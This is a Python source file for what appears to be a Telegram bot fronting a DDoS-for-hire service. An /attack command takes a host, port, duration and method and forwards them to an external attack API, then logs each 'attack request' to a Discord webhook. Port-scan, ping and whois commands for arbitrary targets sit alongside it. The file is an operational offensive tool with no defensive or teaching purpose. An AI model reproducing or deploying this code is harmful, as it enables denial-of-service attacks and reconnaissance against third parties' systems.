import requests, json, whois, emoji, socket, re
from discord_webhook import DiscordWebhook
from ...external import *
from ...data.keys import *

def stripURL(url):
    urla = re.compile(r"https?://(www\.)?")
    urla = urla.sub('', url).strip().strip('/')
    return urla

def getPingStats(array):
    i = 0
    message = ""
    
    for entry in array:
        if "ping statistics" in array[i]:
            newlist = array[i+1:]
            
            print(newlist)
            for entry in newlist:
                entry = re.sub("[[']]", '', entry)
                entry = re.sub("'", '', entry)
                message += entry + "\n"
            return message
        else:
            i += 1
    

def attack(update, context): # host, port, time, method
    isAdmina = isAdmin(update.message.chat.id, OWNERS)
    exists = isUser(update.message.chat.id)
    
    if (exists == True or isAdmina == True):
        
        user = update.message.from_user
        username = user['username']
        
        user = update.message.from_user
        try:
            api = context.args[0]
            host = context.args[1]
            port = context.args[2]
            time = context.args[3]
            method = context.args[4]
            if api == "API1":
                requests.get(f'https://API1/client/api/attack?key=&username=&host={host}&port={port}&time={time}&method={method}"')
                print(f"https://API1/client/api/attack?key=&username=&host={host}&port={port}&time={time}&method={method}")
            elif api == "API2":
                tempmeth = method.lower()
                requests.get(f'https://API1/client/api/attack?key=&username=&host={host}&port={port}&time={time}&method={method}"')
                print(f"https://API1/client/api/attack?key=&username=&host={host}&port={port}&time={time}&method={method}")
            else:
                update.message.reply_text(f"""Invalid API... see /methods""")
                return
            webhook = DiscordWebhook(url=bombing_logs, content=f'New attack request! username: {username} | userID: {update.message.chat.id} | API: {api} | host: {host} | port: {port} | time: {time} seconds | method: {method}')
            response = webhook.execute()
            
            update.message.reply_text(f"""
\u2705 Initiated an attack

API -> {api}
Host -> {host}
Port -> {port}
Time -> {time} seconds
Method -> {method}
""")
        except Exception:
            update.message.reply_text(f"""Incorrect Usage: /attack <api> <host> <port> <time> <method>""")
    else:
        update.message.reply_text(f"""\u274C You are not allowed to use that command""")


def ping(update, context):
    isAdmina = isAdmin(update.message.chat.id, OWNERS)
    exists = isUser(update.message.chat.id)
    
    if (exists == True or isAdmina == True):
        ip = context.args[0]
        
        r = requests.get(f'https://api.c99.nl/ping?key=&host={ip}&json').json()
        try:
            splitted_result = r['splitted_result']
            x = str(splitted_result).split(',')
            message = getPingStats(x)
            update.message.reply_text(f"""
\u2705 Pinging

Host -> {ip}
{message}
""")
            
        except:
            update.message.reply_text(f"""
\u274C We ran into an unexpected issue

Please contact support 
""")
    else:
        update.message.reply_text(f"""\u274C You are not allowed to use that command""")

def lookup(update, context):
    isAdmina = isAdmin(update.message.chat.id, OWNERS)
    exists = isUser(update.message.chat.id)
    
    if (exists == True or isAdmina == True):
        try:
            url = context.args[0]
            url = stripURL(url)
        except Exception:
            update.message.reply_text(f"""\u274C Incorrect Usage: /whois <host>""")
            return #
        ipAddress = socket.gethostbyname(url)
        try:
            response = whois.whois(url)
  
            update.message.reply_text(emoji.emojize(f"""
\U0001F30D WhoIs {url}

Public IP -> {ipAddress}
Registrant -> {response.registrant_name}
Registrar -> {response.registrar}
Creation Date -> {response.creation_date}
"""))
        except Exception as f:
            print(f)
            update.message.reply_text(f"""
\u274C We ran into an unexpected issue

Public IP -> {ipAddress}

Please contact support 
""")
            
    else:
        update.message.reply_text(f"""\u274C You are not allowed to use that command""")
        
def portscan(update, context):
    
    isAdmina = isAdmin(update.message.chat.id, OWNERS)
    exists = isUser(update.message.chat.id)
    
    if (exists == True or isAdmina == True):
        try:
            ip = context.args[0]
        except Exception:
            update.message.reply_text(f"""\u274C Incorrect Usage: /portscan <ip>""")
            return
        r = requests.get(f'https://api.c99.nl/portscanner?key=&host={ip}')
        update.message.reply_text(f"""
\U0001F30D Open ports for {ip}
{r.text}
                    """)
        
        
    else:
        update.message.reply_text(f"""\u274C You are not allowed to use that command""")
